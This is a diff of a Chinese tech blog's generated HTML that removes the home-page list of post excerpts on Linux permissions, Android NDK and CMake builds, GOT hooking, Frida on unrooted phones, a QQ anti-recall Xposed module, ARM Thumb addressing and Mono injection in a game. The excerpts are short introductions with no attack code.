class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%A2%98"><span class="toc-number">18.1.</span> <span class="toc-text">第一题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AF%94%E8%B5%9B%E6%97%B6%E9%97%B4%E5%86%85%E6%9C%AA%E5%AE%8C%E6%88%90%E7%9A%84%E9%A2%98"><span class="toc-number">19.</span> <span class="toc-text">比赛时间内未完成的题</span></a></li></ol>
+                    </div>
+                </span>
             </div>
         </div>
         
-        
     </div>
 </aside>
 
 
 
-
-  
-    <article id="post-why-linux-rm-dirfile-need-x" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/25/why-linux-rm-dirfile-need-x/">为什么Linux删除文件需要文件夹的可执行权限</a>
-    </h1>
-  
-
-
-        
-        <a href="/2021/08/25/why-linux-rm-dirfile-need-x/" class="archive-article-date">
-  	<time datetime="2021-08-25T03:01:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-25</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-
-      
-    
-        
-        
-            
-            
-        
-            
-            
-        
-            
-            
-        
-        
-            
-            <p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>在Linux系统中，需要对文件所在目录有读写权限和可执行权限，才可以删除文件。读写权限很好理解，因为需要读取和修改文件夹内容信息。而可执行权限感觉有点奇怪，谷歌+分析内核源码，得到答案。</p>
-<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>注意：需要使用普通用户进行以下操作</p>
-<p>首先使用<code>mkdir</code>创建一个目录，查看其权限，为<code>drwxr-xr-x</code>(755)<br>然后在该目录下创建文件，查看权限为<code>-rw-r--r--</code>(644)<br>可以看到文件夹和文件的默认权限是不同的，文件夹具有可执行权限</p>
-<p>
-        
-
-          <a class="article-more-a" href="/2021/08/25/why-linux-rm-dirfile-need-x/#more">查看更多 >></a>
-        
-    
-    
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Linux</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/25/why-linux-rm-dirfile-need-x/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-ndk-warning-dt-flags" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/24/ndk-warning-dt-flags/">解决WARNING linker unsupported flags DT_FLAGS_1</a>
-    </h1>
-  
-
-
-        
-        <a href="/2021/08/24/ndk-warning-dt-flags/" class="archive-article-date">
-  	<time datetime="2021-08-23T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-24</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-
-      
-    
-        
-        
-            
-            
-        
-            
-            
-        
-            
-            
-        
-        
-            
-            <p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>使用最新版本的NDK编译<code>victim</code>，执行时提示<code>WARNING: linker: unsupported flags DT_FLAGS_1=0x8000001</code>(不影响运行)。</p>
-<h2 id="处理"><a href="#处理" class="headerlink" title="处理"></a>处理</h2><p>可使用<code>termux-elf-cleaner</code>替换<code>victim-patch-arm</code>的<code>DT_FLAGS_1</code>，从而去除<code>WARNING</code>：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">elf-cleaner.exe victim-patch-arm</span><br></pre></td></tr></table></figure>
-<p>
-        
-
-          <a class="article-more-a" href="/2021/08/24/ndk-warning-dt-flags/#more">查看更多 >></a>
-        
-    
-    
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/24/ndk-warning-dt-flags/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-android-arm-got-hook" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/23/android-arm-got-hook/">简易Android ARM&amp;ARM64 GOT Hook (一)</a>
-    </h1>
-  
-
-
-        
-        <a href="/2021/08/23/android-arm-got-hook/" class="archive-article-date">
-  	<time datetime="2021-08-23T02:56:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-23</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-
-      
-    
-        
-        
-            
-            
-        
-            
-            
-        
-            
-            
-        
-        
-            
-            <p><h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><p><a href="https://blog.xhyeax.com/2021/08/30/android-arm-plt-hook/">简易Android ARM&amp;ARM64 GOT Hook (二)</a><br>基本思路为：基于执行视图，解析内存中的ELF，查找导入符号并替换函数地址</p>
-<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>本文以Hook公共库<code>libc.so</code>的<code>getpid</code>函数为例，基于ELF的链接视图(<code>Linking View</code>)，讨论<code>Android</code> <code>ARM&amp;ARM64</code>架构的<code>GOT/PLT Hook</code>。</p>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>程序<code>加载</code>后，在执行之前，需要先进行<code>动态链接</code>，并进行<code>重定位</code>。</p>
-<p>
-        
-
-          <a class="article-more-a" href="/2021/08/23/android-arm-got-hook/#more">查看更多 >></a>
-        
-    
-    
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/23/android-arm-got-hook/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-arm-compile-without-as" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/22/arm-compile-without-as/">使用CMake交叉编译Android ARM程序</a>
-    </h1>
-  
-
-
-        
-        <a href="/2021/08/22/arm-compile-without-as/" class="archive-article-date">
-  	<time datetime="2021-08-22T07:32:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-22</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-
-      
-    
-        
-        
-            
-            
-        
-            
-            
-        
-            
-            
-        
-        
-            
-            <p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>脱离<code>Android Studio</code>，使用<code>CMake</code>交叉编译，生成<code>Android ARM</code>可执行文件及公共库。</p>
-<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><code>CMake 3.10.2</code>、<code>NDK 21.4.7075529</code>（从<code>Android Studio</code>的<code>SDK Manager</code>中下载）<br><code>ABI</code>:<code>armeabi-v7a</code></p>
-<h2 id="CMakeLists-txt"><a href="#CMakeLists-txt" class="headerlink" title="CMakeLists.txt"></a>CMakeLists.txt</h2><h3 id="可执行文件"><a href="#可执行文件" class="headerlink" title="可执行文件"></a>可执行文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cmake_minimum_required(VERSION 3.10.2)</span><br><span class="line"></span><br><span class="line">project(victim)</span><br><span class="line"></span><br><span class="line">add_executable(victim victim.cpp)</span><br></pre></td></tr></table></figure>
-<p>
-        
-
-          <a class="article-more-a" href="/2021/08/22/arm-compile-without-as/#more">查看更多 >></a>
-        
-    
-    
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/22/arm-compile-without-as/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-frida-no-root" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/06/frida-no-root/">Frida在无Root机器上的使用方案 (基于VirtualApp)</a>
-    </h1>
-  
-
-
-        
-        <a href="/2021/08/06/frida-no-root/" class="archive-article-date">
-  	<time datetime="2021-08-06T06:03:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-06</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-
-      
-    
-        
-        
-            
-            
-        
-            
-            
-        
-            
-            
-        
-        
-            
-            <p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>大多数国产手机厂商出于安全考虑，禁止用户解锁BootLoader，因此也就无法通过Magisk获取Root权限。<br>本文基于<a target="_blank" rel="noopener" href="https://github.com/asLody/VirtualApp">VirtualApp框架</a>及<a target="_blank" rel="noopener" href="https://github.com/frida/frida">Frida-Gadget</a>，实现不修改apk使用Frida。</p>
-<h2 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h2><h3 id="修改框架源码"><a href="#修改框架源码" class="headerlink" title="修改框架源码"></a>修改框架源码</h3><p>阅读<code>VirtualApp</code>源码可知，在<a target="_blank" rel="noopener" href="https://github.com/asLody/VirtualApp/blob/bd6f03cfd7cbf3ad63ec6198777a102c18112c2d/VirtualApp/lib/src/main/jni/Foundation/IOUniformer.cpp"><code>lib/src/main/jni/Foundation/IOUniformer.cpp</code></a>中hook了<code>dlopen</code>，并实现了<code>onSoLoaded</code>函数，可在该函数中通过传入的<code>filename</code>获取加载的动态库路径。</p>
-<p>由此，可以在<code>libart.so</code>加载后，手动调用<code>dlopen</code>加载<code>Frida-Gadget</code>（将arm版本的so文件及配置文件添加到<code>lib\src\main\jniLibs\armeabi-v7a</code>）。</p>
-<p>
-        
-
-          <a class="article-more-a" href="/2021/08/06/frida-no-root/#more">查看更多 >></a>
-        
-    
-    
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/06/frida-no-root/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-qq-8817-unrevoke-and-infinite-flashpic" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/04/qq-8817-unrevoke-and-infinite-flashpic/">QQ 8.8.17 防撤回、无限打开闪照</a>
-    </h1>
-  
-
-
-        
-        <a href="/2021/08/04/qq-8817-unrevoke-and-infinite-flashpic/" class="archive-article-date">
-  	<time datetime="2021-08-04T00:33:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-04</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-
-      
-    
-        
-        
-            
-            
-        
-            
-            
-        
-            
-            
-        
-        
-            
-            <p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>之前写过一篇<a href="https://blog.xhyeax.com/2019/09/18/qq-813-unrevoke-module-develop/">QQ8.1.3防撤回原理</a>，每次更新后，都需要适配被混淆的类名。</p>
-<p>今天更新了最新版QQ（<code>8.8.17</code>），发现使用到的类名都未被混淆，不过包结构有了一定变化（可能是重构了？），需要重新适配。</p>
-<p>于是尝试使用<code>objection</code>分析撤回提示的实现，并编写<code>Xposed</code>模块。</p>
-<p>
-        
-
-          <a class="article-more-a" href="/2021/08/04/qq-8817-unrevoke-and-infinite-flashpic/#more">查看更多 >></a>
-        
-    
-    
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/04/qq-8817-unrevoke-and-infinite-flashpic/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-arm-thumb-pc-address" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/03/arm-thumb-pc-address/">ARM Thumb状态下 相对pc寄存器寻址问题</a>
-    </h1>
-  
-
-
-        
-        <a href="/2021/08/03/arm-thumb-pc-address/" class="archive-article-date">
-  	<time datetime="2021-08-02T19:27:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-03</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-
-      
-    
-        
-        
-            
-            
-        
-            
-            
-        
-            
-            
-        
-        
-            
-            <p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>在一篇文章（<a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1486586-1-1.html">实现简易安卓inlinehook</a>）中，Thumb状态下，相对寄存器pc寻址，结果不符合预期。谷歌后找到原因。</p>
-<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/arm-address-not-4-byte.png"><br>问题指令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">B3AFB212 ldr r2,[pc,#2]            #预期R2=[pc+4+2=B3AFB218]，结果变为[B3AFB216]</span><br><span class="line">B3AFB216 mov r0, r0                #将pc赋值，替换为 mov r0, r0 方便测试</span><br><span class="line">B3AFB218 xx xx xx xx               #跳回地址，以78563412为例（小端模式）</span><br></pre></td></tr></table></figure>
-<p>
-        
-
-          <a class="article-more-a" href="/2021/08/03/arm-thumb-pc-address/#more">查看更多 >></a>
-        
-    
-    
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/03/arm-thumb-pc-address/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-draw-and-guess-save-history" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/01/draw-and-guess-save-history/">基于Mono注入 保存你画我猜历史房间数据</a>
-    </h1>
-  
-
-
-        
-        <a href="/2021/08/01/draw-and-guess-save-history/" class="archive-article-date">
-  	<time datetime="2021-07-31T20:06:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-01</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-
-      
-    
-        
-        
-            
-            
-        
-            
-            
-        
-            
-            
-        
-        
-            
-            <p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>最近在Steam购买了你画我猜(<code>Draw &amp; Guess</code>)，游戏并不支持保存最近房间代码，以及玩家id。<br>由于众所周知的服务器原因（土豆做的），经常有人掉线或闪退（也可能是自己），重连后无法返回之前的房间。</p>
-<p>于是考虑使用Mono注入技术，实现历史房间数据的保存。</p>
-<h2 id="逆向分析过程"><a href="#逆向分析过程" class="headerlink" title="逆向分析过程"></a>逆向分析过程</h2><h3 id="文件结构分析"><a href="#文件结构分析" class="headerlink" title="文件结构分析"></a>文件结构分析</h3><p>查看游戏目录结构，发现是使用Unity编写的Mono平台游戏，关键dll文件位于<code>..\steamapps\common\Draw &amp; Guess\Draw&amp;Guess_Data\Managed</code>，并且未加密。</p>
-<p>
-        
-
-          <a class="article-more-a" href="/2021/08/01/draw-and-guess-save-history/#more">查看更多 >></a>
-        
-    
-    
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">游戏逆向</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/01/draw-and-guess-save-history/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
   
   
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
-    </nav>
+  
+
+  
+
+  
+
   
 
 
@@ -1170,8 +455,8 @@ var _hmt = _hmt || [];
     <script>
 	var yiliaConfig = {
 		mathjax: true,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
